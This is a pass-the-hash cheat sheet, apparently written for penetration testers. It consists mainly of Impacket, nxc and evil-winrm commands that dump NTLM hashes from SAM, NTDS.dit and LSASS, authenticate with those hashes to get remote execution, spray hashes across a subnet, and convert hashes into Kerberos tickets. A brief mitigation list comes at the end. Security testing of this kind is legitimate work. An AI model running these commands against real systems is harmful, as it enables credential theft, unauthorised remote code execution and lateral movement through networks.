# Pass-the-Hash (PtH) with Impacket

Using NTLM hashes to authenticate without cracking the plaintext password.

## Concept

Windows authentication uses NTLM hashes. If you have a hash, you can authenticate as that user without knowing the password. No need to crack.

## Getting Hashes

```bash
# From SAM (local)
secretsdump.py -sam SAM -system SYSTEM LOCAL

# From NTDS.dit (domain)
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL

# Remote extraction (need admin)
secretsdump.py domain.local/admin:password@10.10.10.10
secretsdump.py -hashes :aadm3b... domain.local/admin@10.10.10.10

# From lsass dump
pypykatz lsa minidump lsass.dmp
```

## Pass-the-Hash Authentication

```bash
# WMI execution
wmiexec.py -hashes :aadm3b4b9a5c1c3e3e5e7e9e1e3e5e7 domain.local/user@10.10.10.10

# SMB execution
smbexec.py -hashes :aadm3b4b9a5c1c3e3e5e7e9e1e3e5e7 domain.local/user@10.10.10.10

# PsExec-style
psexec.py -hashes :aadm3b4b9a5c1c3e3e5e7e9e1e3e5e7 domain.local/user@10.10.10.10

# Pass-the-hash via crackmapexec (now nxc)
nxc smb 10.10.10.10 -u user -H aadm3b4b9a5c1c3e3e5e7e9e1e3e5e7

# WinRM
evil-winrm -i 10.10.10.10 -u user -H aadm3b4b9a5c1c3e3e5e7e9e1e3e5e7
```

## Lateral Movement Chain

```bash
# 1. Dump hashes from first compromised host
secretsdump.py domain.local/user:password@10.10.10.10

# 2. Use admin hash to access next host
wmiexec.py -hashes :new_hash domain.local/admin@10.10.10.20

# 3. Repeat - pivot through network
```

## spray hashes across a subnet

```bash
# nxc (crackmapexec successor)
nxc smb 10.10.10.0/24 -u Administrator -H aadm3b4b9a5c1c3e3e5e7e9e1e3e5e7

# With credentials file
nxc smb 10.10.10.0/24 -u users.txt -H hashes.txt --continue-on-success
```

## PtH Restrictions

- **NTLM hashes**: Work for PtH
- **NTLMv2 hashes**: Challenge-response, NOT passable (need to relay)
- **Kerberos tickets**: Use pass-the-ticket instead
- **AES keys**: Can be used for Kerberos (overpass-the-hash)

## Overpass-the-Hash (Hash to Ticket)

```bash
# Get TGT using NTLM hash
python3 getTGT.py -hashes :aadm3b... domain.local/user

# Use the TGT
export KRB5CCNAME=user.ccache
python3 wmiexec.py -k -no-pass domain.local/user@hostname.domain.local
```

## Mitigation

- Enable LSA Protection (RunAsPPL)
- Enable Credential Guard (Windows 10+)
- Disable WDigest (cleartext in LSASS)
- Restrict local admin accounts via GPO
- Monitor for unusual authentication patterns (event 4624)
